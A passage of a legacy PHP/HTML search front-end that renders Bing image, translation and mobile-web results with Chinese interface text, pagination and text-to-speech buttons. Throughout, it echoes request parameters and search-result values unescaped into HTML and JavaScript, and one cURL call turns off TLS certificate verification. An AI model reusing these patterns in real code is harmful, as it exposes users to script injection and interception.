                			$searchresult1 = $bing_search->bingsearch(trim($Sources),trim($query),$pagesize,$page+1,trim($marketstr));			
                			for($i = 0; $i < $pagesize; $i++) {
												array_push($searchresult, $searchresult1[$i]);
											}
 
                			//print_r($searchresult);               
                    	//exit;                 			     	
                  	}												                    
                        for($i=trim(request("offset")); $i < 8+trim(request("offset"));$i++){
                                //$objHdd = $objList->item($i);
                                $nodetitle = str_replace('"', "", ($searchresult[$i]['nodetitle']));
                                $nodelink = str_replace('"', "", ($searchresult[$i]['nodelink']));
																$nodeurl = str_replace('"', "", ($searchresult[$i]['nodeurl']));    
                                $nodewidth = str_replace('"', "", ($searchresult[$i]['nodewidth']));
                                $nodeheight = str_replace('"', "", ($searchresult[$i]['nodeheight']));
																$nodefilesize = str_replace('"', "", ($searchresult[$i]['nodefilesize'])); 		
																$nodethumburl = str_replace('"', "", ($searchresult[$i]['nodethumburl'])); 	
																							
																if(trim(request("offset"))<8){	
																	if($page==1){
																		$loffset=0;
																		$lpage = 1;																		
																		$roffset = trim(request("offset"))+8;	
																		$rpage = 1;																			
																		$ppage = trim(request("ppage"))==''?trim(request("page")):trim(request("ppage"));	
																		$poffset = trim(request("poffset"))==''?trim(request("offset")):trim(request("poffset"));
																		$tpage = 1;
																		$toffset = $i;
																	}elseif($page>1){
																		$loffset=trim(request("offset"))+$pagesize-8;
																		$lpage = 1;																					
																		$roffset = trim(request("offset"))+8;		
																		$rpage = $page;																																				
																		$ppage = trim(request("ppage"))==''?trim(request("page")):trim(request("ppage"));	
																		$poffset = trim(request("poffset"))==''?trim(request("offset")):trim(request("poffset"));	
																		$tpage = $page;		
																		$toffset = $i;																																		
																	}			
																}elseif(trim(request("offset"))<($pagesize-8)&&trim(request("offset"))>=8){						
																	$loffset = trim(request("offset"))-8;
																	$lpage = $page;																		
																	$roffset = trim(request("offset"))+8;
																	$rpage = $page;																	
																	$ppage = trim(request("ppage"))==''?trim(request("page")):trim(request("ppage"));	
																	$poffset = trim(request("poffset"))==''?trim(request("offset")):trim(request("poffset"));	
																	$tpage = $page;
																	$toffset = $i;																			
																}
																elseif(trim(request("offset"))>=($pagesize-8)&&trim(request("offset"))<$pagesize){	
																	$loffset = trim(request("offset"))-8;
																	$lpage = $page;																		
																	$roffset = trim(request("offset"))+8-$pagesize;
																	$rpage = $page+1;																	
																	$ppage = trim(request("ppage"))==''?trim(request("page")):trim(request("ppage"));	
																	$poffset = trim(request("poffset"))==''?trim(request("offset")):trim(request("poffset"));		
																	if($i>=$pagesize){															
																		$tpage = $page+1;
																		$toffset = $i-$pagesize;	
																	}elseif($i<$pagesize){															
																		$tpage = $page;
																		$toffset = $i;	
																	}																														
																}

																																
                              	if(($i-trim(request("offset")))%8==0){
                                ?>  
        <tr class="">	  
                 <td class="tdbg" align="center" valign="middle" width="" height="" style="border-bottom:1px solid <?php echo arrmember($style->skincolorarray($skincolor),'tdbg');?>;width:20px;height:120px;<?php $style->selcolor($skincolor,'tdbg');?>" id="result" onmouseover="this.style.backgroundColor='#f9f9f9';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='';">  
																<?php                
                               	print_r("<a style='font-size:55px;text-align:center;' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&ppage=".$ppage."&poffset=".$poffset."&pagesize=".encodeuri($pagesize)."&page=".$lpage."&offset=".($loffset)."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&act=imageview' title='".$nodethumburl." ".$sCrLf.($nodelink)." ".$sCrLf.$nodetitle." ".$sCrLf.($nodeurl)."'><</a>");
                                ?>
                </td>          	   
																<?php
																}
																?>
                <td class="<?php echo $i%2==1?'tdbg':'';?>" align="center" valign="middle" width="" height="" style="border-bottom:1px solid <?php echo arrmember($style->skincolorarray($skincolor),'tdbg');?>;width:120px;height:120px;<?php $i%4==3?$style->selcolor($skincolor,'tdbg'):'';?>" id="result" onmouseover="this.style.backgroundColor='#f9f9f9';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='';">
																
                                <?php 
														
                            
                                if(trim($nodetitle) == ''){
                        					if(trim($nodedescript) == ''){
                        						$nodetitle = $nodelink;
                        					}else{                                	
                                		$nodetitle = $nodedescript;
                                	}	
                        				}
                       				
                               	print_r("<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&photourl=".encodeuri($nodeurl)."&pagesize=".encodeuri($pagesize)."&ppage=".$ppage."&poffset=".$poffset."&page=".$tpage."&offset=".($toffset)."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&act=imageview' title='".$nodethumburl." ".$sCrLf.($nodelink)." ".$sCrLf.$nodetitle." ".$sCrLf.($nodeurl)."'><img src='".($nodethumburl)."' width='80%' height='80%' /></a>");
                                ?>
                </td> 
																<?php
                              	if(($i-trim(request("offset")))%8==7){
                                ?> 
                 <td class="tdbg" align="center" valign="middle" width="" height="" style="border-bottom:1px solid <?php echo arrmember($style->skincolorarray($skincolor),'tdbg');?>;width:20px;height:120px;<?php $i%4==3?$style->selcolor($skincolor,'tdbg'):'';?>" id="result" onmouseover="this.style.backgroundColor='#f9f9f9';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='';">   
																<?php                
                               	print_r("<a style='font-size:55px;text-align:center;' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&ppage=".$ppage."&poffset=".$poffset."&page=".$rpage."&offset=".$roffset."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&act=imageview' title='".$nodethumburl." ".$sCrLf.($nodelink)." ".$sCrLf.$nodetitle." ".$sCrLf.($nodeurl)."'>></a>");
                                ?>
                </td>  
        </tr>                                                     																
																<?php
																}
																?>        
                                <?php                               
                                                 
                        }
                        ?>
                      
</table>       
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">                   
        <tr class="tdtbg" height="30" >
                        <?php 
                        

                        
                        ?>
                <td align="center" colspan="3" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> 共 <?php echo $totalpage;?> 页 第  
                        <?php 
                        echo $page." 页".$sCrlf.' ';
                        echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&ppage=".$ppage."&poffset=".$poffset."&page=1&offset=0&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&act=imageview'>首页</a> ";
                       
                        if (floor($page) > 1)
                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&ppage=".$ppage."&poffset=".$poffset."&page=".encodeuri($page-1)."&offset=0&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&act=imageview'>上一页</a> ";
                        if (floor($page) > 0 && floor($page) < floor($totalpage))
                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&ppage=".$ppage."&poffset=".$poffset."&page=".encodeuri($page+1)."&offset=0&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&act=imageview'>下一页</a> ";
                        echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&ppage=".$ppage."&poffset=".$poffset."&page=67&offset=0&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&act=imageview'>末页</a> ";
        
                				?>
                				<input name="page" class='input' border="0" value="<?php  echo $page; ?>" style="height:20px;width:40px;font-size:11px;text-align:center;" <?php  $style->input("#f9f9f9",""); ?>>
              					<input type="hidden" class="text" name="ppage" value="<?php echo $ppage;?>" size="1">
              					<input type="hidden" class="text" name="poffset" value="<?php echo $poffset;?>" size="1">
              					<input type="hidden" class="text" name="offset" value="0" size="1">    
              					<input type="hidden" class="text" name="act" value="imageview" size="1">           					           				
												<input type="submit" style="<?php $style->selcolor($skincolor,'tdtbg');?>" class="button" name="gotopage" value=" Go ">                 
                				<?php 

                        
                        ?>
                </td>
        </tr>   
</table>                        
                <?php 
                	}
                	else{
                		$bing_search = new bing_class();
                		$searchresult = $bing_search->bingsearch(trim($Sources),trim($query),trim($pagesize),$page,trim($marketstr));  
                		//print_r($searchresult);               
                    //exit; 
                    
                        if (!$searchresult){
                        ?>      
<table width="95%" height="30" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> 搜 索 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result" style="<?php $style->selcolor($skincolor,'tdbg');?>">
                搜索发生意外错误，请重试！
                </td>
        </tr>   
</table>                
                        <?php       
                                break;
                        }
                        elseif ($searchresult['totalitem'] == 0){
                        ?>
<table width="95%" height="30" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> 搜 索 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result" style="<?php $style->selcolor($skincolor,'tdbg');?>">
                未搜索到任何数据，请优化检索词。
                </td>
        </tr>   
</table>                        
                        <?php 
                                        break;
                        }

                        if ($searchresult['totalitem'] > $pagesize) $strpagesize = $pagesize; else $strpagesize = $searchresult['totalitem'];
                        //echo $strpagesize;
                        $totalitem = $searchresult['totalitem'];
                        $totalpage=$searchresult['totalpage'];
                        //$page = $searchresult['page'];
                        if($page > $totalpage){
                                redirect(httppath().'?Query='.encodeuri($query).'&Sources='.encodeuri($soSources).'&pagesize='.encodeuri($pagesize).'&page='.encodeuri($totalpage).'&skin='.$skincolor.'&market='.$marketstr.'&charset='.getcharset());
                                break;                  
                        }
                        ?>

<table width="95%" align="center" cellspacing="" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="<?php echo trim(request('imagelist'))=='list'?'3':'5';?>" height="30"  style="<?php $style->selcolor($skincolor,'tdtbg');?>"> 搜索结果 : 共 <?php  echo $searchresult['totalitem'];?> 条,仅显示前 1000 条 </td>
        </tr>   
                  
												<?php                       
                        for($i=0; $i <= $searchresult['endid'];$i++){
                                //$objHdd = $objList->item($i);
                                $nodetitle = str_replace('"', "", ($searchresult[$i]['nodetitle']));
                                $nodelink = str_replace('"', "", ($searchresult[$i]['nodelink']));
																$nodeurl = str_replace('"', "", ($searchresult[$i]['nodeurl']));    
                                $nodewidth = str_replace('"', "", ($searchresult[$i]['nodewidth']));
                                $nodeheight = str_replace('"', "", ($searchresult[$i]['nodeheight']));
																$nodefilesize = str_replace('"', "", ($searchresult[$i]['nodefilesize'])); 		
																$nodethumburl = str_replace('"', "", ($searchresult[$i]['nodethumburl'])); 														$nodeid = str_replace('"', "", ($searchresult[$i]['nodeid']));		
																if(trim(request('imagelist'))=='list'){                                
                                ?>                              
        <tr class="<?php echo $i%4==3?'tdbg':'';?>">
        	           <td align="center" width=4% style="border-bottom:1px solid <?php echo arrmember($style->skincolorarray($skincolor),'tdbg');?>;<?php $i%4==3?$style->selcolor($skincolor,'tdbg'):'';?>">
                     					  <?php echo $i+1;?>
               	</td>  
                <td align="left" style="border-bottom:1px solid <?php echo arrmember($style->skincolorarray($skincolor),'tdbg');?>;<?php $i%4==3?$style->selcolor($skincolor,'tdbg'):'';?>" height="30" id="result" onmouseover="this.style.backgroundColor='#f9f9f9';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='';">
                                <?php 
														
                            
                                if(trim($nodetitle) == ''){
                        					if(trim($nodedescript) == ''){
                        						$nodetitle = $nodelink;
                        					}else{                                	
                                		$nodetitle = $nodedescript;
                                	}	
                        				}
                               	print_r("<a style='' href='".$nodelink."' title='".$nodethumburl." ".$sCrLf.($nodelink)." ".$sCrLf.$nodetitle." ".$sCrLf.($nodeurl)."' target='_blank'>".($nodetitle)."</a>");
                                ?>
                </td>
                <td align="center" style="border-bottom:1px solid <?php echo arrmember($style->skincolorarray($skincolor),'tdbg');?>;<?php $i%4==3?$style->selcolor($skincolor,'tdbg'):'';?>" width="17%" onmouseover="this.style.backgroundColor='#f9f9f9';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='';"> 
                        <table width="95%">
                                <tr>
                                        <td align="center">
                                                <a style='' href="http://api.webthumbnail.org/?width=1024&height=800&screen=1280&format=png&url=<?php echo encodeuri($nodelink);?>"  target=_blank><?php  echo formatchar("缩略");?></a> 
																		            <a style='' href="#" onclick="javascript:window.external.AddFavorite('<?php  echo $nodelink; ?>','<?php  echo $nodetitle; ?>')" target=_self><?php  echo formatchar("收藏");?></a> 
                                                <a style='' href="http://api.addthis.com/oexchange/0.8/offer?url=<?php echo encodeuri($nodelink);?>&title=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodetitle));?>&description=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodedescript))?>&pubid=x3193" target=_blank><?php echo formatchar("网收");?></a>
                                        </td>   
                                </tr>
                        </table>                        
                </td>
        </tr>   
                                <?php 
                              }else{
                              	if($i%5==0){
                                ?>                              
        <tr>
																<?php
																}
																?>
                <td align="center" style="<?php $i%2==1?$style->selcolor($skincolor,'tdbg'):'';?>" valign="middle" width="20%" height="200" id="result" onmouseover="this.style.backgroundColor='#f9f9f9';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='';">
                                <?php 
														
                            
                                if(trim($nodetitle) == ''){
                        					if(trim($nodedescript) == ''){
                        						$nodetitle = $nodelink;
                        					}else{                                	
                                		$nodetitle = $nodedescript;
                                	}	
                        				}

                               	print_r("<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".$pagesize."&page=".$page."&offset=".($i)."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&act=imageview' title='".$nodethumburl." ".$sCrLf.($nodelink)." ".$sCrLf.$nodetitle." ".$sCrLf.($nodeurl)."' target='_blank'><img src='".($nodethumburl)."' width='80%' height='80%' /></a>");
                                ?>
                </td>
																<?php
                              	if($i%5==4){
                                ?>  																

        </tr>   
																<?php
																}
																?>        
                                <?php                               
                              }                     
                        }
                        ?>
</table>       
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">                   
        <tr class="tdtbg" height="30" >
                        <?php 
                        

                        
                        ?>
                <td align="center" colspan="3" style="<?php $i%4==3?$style->selcolor($skincolor,'tdtbg'):'';?>"> 共 <?php echo $totalpage;?> 页 第  
                        <?php 
                        echo $page." 页".$sCrlf.' ';
                        echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=1&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>首页</a> ";
                       
                        if (floor($page) > 1)
                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page-1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>上一页</a> ";
                        if (floor($page) > 0 && floor($page) < floor($totalpage))
                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page+1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>下一页</a> ";
                        echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=67&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>末页</a> ";
        
                				?>
                				<input name="page" class='input' border="0" value="<?php  echo $page; ?>" style="height:20px;width:40px;font-size:11px;text-align:center;" <?php  $style->input("#f9f9f9",""); ?>>
												<input type="submit" style="<?php $style->selcolor($skincolor,'tdtbg');?>" class="button" name="gotopage" value=" Go ">                 
                				<?php 

                        
                        ?>
                </td>
        </tr>   
</table>                        
                <?php 
                	}
                //$gotopage->gotopage($totalpage,"?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&gopage=ok&page=","请输入要转到的页数","请在空白处输入要转到的页数");
                } // image if end
                elseif (strpos($Sources,"Translate") !== false){ // web if start
 
                		$bing_search = new bing_class();
                		$searchresult = $bing_search->bingsearch(trim($Sources),trim($query),trim($pagesize),$page,'',$tolang);  
               			$lang = split('[|]',$bing_search->bingsearchcountrycode()); 
               			$voiceresult = $bing_search->bingttsvoice('all');
                		//print_r($voiceresult);
                		//print_r($lang);        
                		//print_r($searchresult);          
                    //exit;

                        if (!$searchresult){
                        ?>      
<table width="95%" height="30" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="30">
                <td align="center" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> 搜 索 结 果 </td>
        </tr>
        <tr class="tdbg" height="30" style="<?php $style->selcolor($skincolor,'tdbg');?>">
                <td align="center" id="result">
                搜索发生意外错误，请重试！
                </td>
        </tr>   
</table>                
                        <?php       
                                break;
                        }
                        elseif (count($searchresult) == 0){
                        ?>
<table width="95%" height="50" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="30" >
                <td align="center" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> 搜 索 结 果 </td>
        </tr>
        <tr class="tdbg" height="30"  style="<?php $style->selcolor($skincolor,'tdbg');?>">
                <td align="center" id="result">
                未搜索到任何数据，请优化检索词。
                </td>
        </tr>   
</table>                        
                        <?php 
                                        break;
                        }

                        if (count($searchresult) >= $pagesize) $strpagesize = $pagesize; else $strpagesize = count($searchresult);
                        //echo $strpagesize;
                        $totalitem = count($lang);
                        $totalpage=ceil($totalitem/$pagesize);
                        //$page = $searchresult['page'];
                        if($page > $totalpage){
                                redirect(httppath().'?Query='.encodeuri($query).'&Sources='.encodeuri($soSources).'&pagesize='.encodeuri($pagesize).'&page='.encodeuri($totalpage).'&skin='.$skincolor.'&tolang='.$tolang.'&charset='.getcharset());
                                break;                  
                        }
                        ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3" height="30" style="<?php $style->selcolor($skincolor,'tdtbg');?>" > 搜索结果 : 共 <?php  echo $totalitem;?> 条,仅显示前 1000 条 </td>
        </tr>   
                        <?php        
												$page=min(ceil(count($lang)/$pagesize),$page);                              
                        for($i=(($tolang=='multi')?$pagesize*($page-1):0);$i<(($tolang=='multi')?min(count($lang),$pagesize*($page)):'1');$i++){         
                        //for($i=0; $i < ($tolang=='multi'?$pagesize:'1');$i++){
                                //$objHdd = $objList->item($i);
                                ?>                              
        <tr class="<?php echo $i%4==3?'tdbg':'';?>">
        	      <td align="center" width=4% style="border-bottom:1px solid <?php echo arrmember($style->skincolorarray($skincolor),'tdbg');?>;<?php $i%4==3?$style->selcolor($skincolor,'tdbg'):'';?>">
                     					  <?php echo $i+1;?>
               	</td>  
                <td align="left" style="border-bottom:1px solid <?php echo arrmember($style->skincolorarray($skincolor),'tdbg');?>;<?php $i%4==3?$style->selcolor($skincolor,'tdbg'):'';?>" height="30" id="result" onmouseover="this.style.backgroundColor='#f9f9f9';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='';">
                                <?php 
                                if($tolang!='multi'){
                                	print_r("<a style='' href='".$nodelink."' title='".($nodelink)." ".$sCrLf.$nodetitle." ".$sCrLf.($nodedescript)."' target='_blank'>".($searchresult[$i]['nodelang'].'-'.$searchresult[$i]['nodeclang'].':'.$searchresult[$i]['nodetext'])."</a>");   
                                	//break;
                                }
                                elseif($searchresult[$i]['nodelang']==arrmember(split("[,]",$lang[$i]),"0")){
																	print_r("<a style='' href='".$nodelink."' title='".($nodelink)." ".$sCrLf.$nodetitle." ".$sCrLf.($nodedescript)."' target='_blank'>".($searchresult[$i]['nodelang'].'-'.$searchresult[$i]['nodeclang'].':'.$searchresult[$i]['nodetext'])."</a>");                                
                              	}elseif($searchresult[$i]['nodelang']!=arrmember(split("[,]",$lang[$i]),"0")){
																	print_r("<a style='' href='".$nodelink."' title='".($nodelink)." ".$sCrLf.$nodetitle." ".$sCrLf.($nodedescript)."' target='_blank'>".(arrmember(split("[,]",$lang[$i]),"0").'-'.arrmember(split("[,]",$lang[$i]),"1").':')."</a>");                                
                              	}
                          $langstr =	arrmember(split("[,]",($tolang!='multi'?$tolang:$lang[$i])),"0");
                          if(arrmember(split('[-]',$langstr),"0")!=''){
														$langstr=arrmember(split('[-]',$langstr),"0");
													}
													//echo $langstr.count($voiceresult[$langstr]).$searchresult[$i]['nodeotext'].($voiceresult[$langstr]);
                                ?>
                </td>
                <td align="center" style="border-bottom:1px solid <?php echo arrmember($style->skincolorarray($skincolor),'tdbg');?>;<?php $i%4==3?$style->selcolor($skincolor,'tdbg'):'';?>" width="17%" onmouseover="this.style.backgroundColor='#f9f9f9';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='';"> 
                        <table width="95%">
                                <tr>
                                        <td align="center">
                                        <?php
                                        IF(!is_wap()){
                                        		?>
																					<audio id="tts<?php echo $i; ?>"></audio>
                                      		<a id='tts_a_<?php echo $i; ?>' style='<?php if($searchresult[$i]['nodeotext']==""||(!$voiceresult[$langstr])){ ?>display:none<?php } ?>' onclick='tts_<?php echo $i; ?>();' target=_blank>语音</a> 
<script>
function tts_<?php echo $i; ?>()
{
 		document.getElementById("tts<?php echo $i; ?>").innerHTML = '<source src="<?php echo httppath();?>?api=bing&action=tts&content=<?php echo encodeuri($searchresult[$i]['nodeotext']);?>" type="audio/x-wav"/>';
 		if(document.getElementById("tts_a_<?php echo $i; ?>").style.color == "red"){
 			document.getElementById("tts<?php echo $i; ?>").pause();			
 		}
 		else{
			document.getElementById("tts<?php echo $i; ?>").play(); 			
 		}
}
 
	var aud<?php echo $i; ?> = document.getElementById("tts<?php echo $i; ?>");
	aud<?php echo $i; ?>.onended = function() {
  	document.getElementById("tts_a_<?php echo $i; ?>").style.color = "";
	}
	aud<?php echo $i; ?>.onprogress = function() {
  	document.getElementById("tts_a_<?php echo $i; ?>").style.color="brown";
	}
	aud<?php echo $i; ?>.onplaying = function() {
  	document.getElementById("tts_a_<?php echo $i; ?>").style.color="red";
	}	
	aud<?php echo $i; ?>.onplay = function() {
  	document.getElementById("tts_a_<?php echo $i; ?>").style.color="grey";
	}	
	aud<?php echo $i; ?>.onpause = function() {
  	document.getElementById("tts_a_<?php echo $i; ?>").style.color="grey";
	}		
</script>                                      		
                                      		<?php
                                      	}
                                      	else{
                                      		?>
                                      		<a style='<?php if($searchresult[$i]['nodeotext']==""||(!$voiceresult[$langstr])){ ?>display:none<?php } ?>' href="<?php echo httppath();?>?api=bing&action=tts&content=<?php echo encodeuri($searchresult[$i]['nodeotext']);?>&download=1" target=_blank>语音</a>
                                      		<?php
                                      	
                                      	}
                                        ?>  
                                               <a style='' href="http://api.webthumbnail.org/?width=1024&height=800&screen=1280&format=png&url=<?php echo encodeuri($nodelink);?>" target=_blank><?php  echo formatchar("缩略");?></a> 
                                               <a style='' href="#" onclick="javascript:window.external.AddFavorite('<?php  echo $nodelink; ?>','<?php  echo $nodetitle; ?>')" target=_self><?php  echo formatchar("收藏");?></a> 
                                               <a style='' href="http://api.addthis.com/oexchange/0.8/offer?url=<?php echo encodeuri($nodelink);?>&title=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodetitle));?>&description=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodedescript))?>&pubid=x3193" target=_blank><?php echo formatchar("网收");?></a>
                                        </td>   
                                </tr>
                        </table>                        
                </td>
        </tr>   
                                <?php                       
                        }
                        ?>
        <tr class="tdtbg" height="30" >
                        <?php 
                        

                        
                        ?>
                <td align="center" colspan="3" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> 共 <?php echo $totalpage;?> 页 第  
                        <?php 
                        echo $page." 页".$sCrlf.' ';
                        echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=1&skin=".$skincolor."&tolang=".encodeuri(trim(request('tolang')))."&market=".encodeuri(trim(request('market')))."'>首页</a> ";
                        if (floor($page) > 1)
                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page-1))."&skin=".$skincolor."&tolang=".encodeuri(trim(request('tolang')))."&market=".encodeuri(trim(request('market')))."'>上一页</a> ";
                        if (floor($page) > 0 && floor($page) < floor($totalpage))
                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page+1))."&skin=".$skincolor."&tolang=".encodeuri(trim(request('tolang')))."&market=".encodeuri(trim(request('market')))."'>下一页</a> ";
        								echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=20&skin=".$skincolor."&tolang=".encodeuri(trim(request('tolang')))."&market=".encodeuri(trim(request('market')))."'>末页</a> ";
                				?>
                				<input class='input' border="0" name="page" id="page" value="<?php  echo $page; ?>" style="height:20px;width:40px;font-size:11px;text-align:center;" <?php  $style->input("#f9f9f9",""); ?> >
												<input type="submit" style="<?php $style->selcolor($skincolor,'tdtbg');?>" class="button" name="gotopage" value=" Go ">                 
                				<?php 

                        
                        ?>
                </td>
        </tr>   
</table>                        
                <?php 
                //$gotopage->gotopage($totalpage,"?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&gopage=ok&page=","请输入要转到的页数","请在空白处输入要转到的页数");
                } // video if end
                elseif (strpos($Sources,"MobileWeb") !== false){ // MobileWeb if start
                        if (0){
                                $url = httppathdir().'plugins/xml/bing/mobileweb.xml';
                        }       
                        else{   
                                $url = 'https://api.datamarket.azure.com/Bing/Search/xml.aspx?AppId='.encodeuri($BingAppId).'&Market='.encodeuri(Trim(request('market'))).'&Query='.encodeuri(iconv('gb2312','utf-8',$query)).'&Sources='.$soSources."&mobileweb.Count=".encodeuri($pagesize).'&mobileweb.Offset='.encodeuri($pagesize*($page-1)).'&xmltype=elementbased';
                        }       
                        
                        $ch = curl_init();
                        curl_setopt($ch, CURLOPT_URL, $url);
                        curl_setopt($ch, CURLOPT_HEADER, 0);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                        curl_setopt($ch, CURLOPT_TIMEOUT, 100);
                        $xmlstr = curl_exec($ch);
                        curl_close($ch);
                        //echo $xmlstr;
                        $objXml = new DOMDocument();  
                        $objXml->preserveWhiteSpace = true;
                        $objXml->async = false; 
                        // 加Xml 文件    
                        $objXml->loadXML($xmlstr);
                        if ($objXml->getElementsByTagName("SearchTerms")->item(0)->nodeValue === false){
                        ?>      
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 搜 索 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                搜索发生意外错误，请重试！
                </td>
        </tr>   
</table>                
                        <?php       
                                break;
                        }
                        elseif ($objXml->getElementsByTagName(arrmember(split("[:]","mw:Total"),"1"))->item(0)->nodeValue == 0){
                        ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 搜 索 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                未搜索到任何数据，请优化检索词。
                </td>
        </tr>   
</table>                        
                        <?php 
                                        break;
                        }
                        $objList = $objXml->getElementsByTagName(arrmember(split("[:]","mw:MobileWebResult"),"1"));
                        //echo $objList->length;
                        if ($objList->length > $pagesize) $strpagesize = $pagesize; else $strpagesize = $objList->length;
                        //echo $strpagesize;
                        ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3"> 搜 索 结 果 : 共 <?php  echo $objXml->getElementsByTagName(arrmember(split("[:]","mw:Total"),"1"))->item(0)->nodeValue;?> 条,仅显示前 1000 条 </td>
        </tr>   
                        <?php                       
                        for($i=0; $i < $strpagesize;$i++){
                                $objHdd = $objList->item($i);
                                ?>                              
        <tr class="tdbg">
                <td align="left" id="result">
                                <?php 
                                $nodetitle = str_replace('"', "",iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]","mw:Title"),"1"))->item(0)->nodeValue)." ");
                                $nodedescript = str_replace('"', "",iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]","mw:Description"),"1"))->item(0)->nodeValue)." ");
